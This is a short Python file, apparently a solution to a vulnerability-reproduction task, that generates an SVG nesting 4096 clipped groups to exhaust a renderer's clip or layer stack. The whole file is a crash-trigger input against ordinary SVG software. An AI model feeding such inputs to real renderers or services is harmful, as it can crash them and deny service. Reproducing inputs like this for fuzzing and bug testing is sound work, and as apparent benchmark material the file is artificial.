import os


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate an SVG with deeply nested clipped groups to stress clip/layer stack depth
        depth = 4096

        header_lines = [
            '<?xml version="1.0"?>',
            '<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">',
            '<defs>',
            '<clipPath id="c"><rect x="0" y="0" width="100" height="100"/></clipPath>',
            '</defs>',
        ]

        open_group = '<g clip-path="url(#c)">'
        close_group = '</g>'

        lines = []
        lines.extend(header_lines)

        for _ in range(depth):
            lines.append(open_group)

        lines.append('<rect x="0" y="0" width="100" height="100"/>')

        for _ in range(depth):
            lines.append(close_group)

        lines.append('</svg>')

        svg_data = '\n'.join(lines)
        return svg_data.encode('utf-8')